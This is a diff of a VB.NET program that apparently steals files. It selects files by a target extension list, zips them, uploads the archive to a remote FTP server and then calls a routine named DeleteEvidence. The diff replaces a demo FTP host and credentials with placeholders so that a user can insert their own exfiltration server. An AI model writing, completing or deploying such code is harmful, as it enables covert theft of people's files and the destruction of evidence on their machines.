@@ -61,7 +61,7 @@ Module Module1
         Next
     End Sub
     Private Sub Target(ByVal fn As String)
-        Dim target() As String = New String() {"cch"} 'Or change it by will
+        Dim target() As String = New String() {"cch"} 'Change it by will,and make sure all elements are lowercase
         Dim f As String
 
         f = Path.GetFileName(fn).ToLower()
@@ -91,11 +91,11 @@ Module Module1
         ZipFile.CreateFromDirectory(mypath, zip)
     End Sub
     Private Sub Upload()
-        Const ftp As String = "ftp://demo.wftpserver.com/upload/"
+        Const ftp As String = "Your FTP server here"
         Dim temp, server As String
         temp = Path.GetFileNameWithoutExtension(Path.GetTempFileName) + ".zip"
         server = Path.Combine(ftp, temp)
-        My.Computer.Network.UploadFile(zip, server, "demo", "demo")
+        My.Computer.Network.UploadFile(zip, server, "", "") 'Add username and password if required
         MsgBox("Done!")
     End Sub
     Private Sub DeleteEvidence()
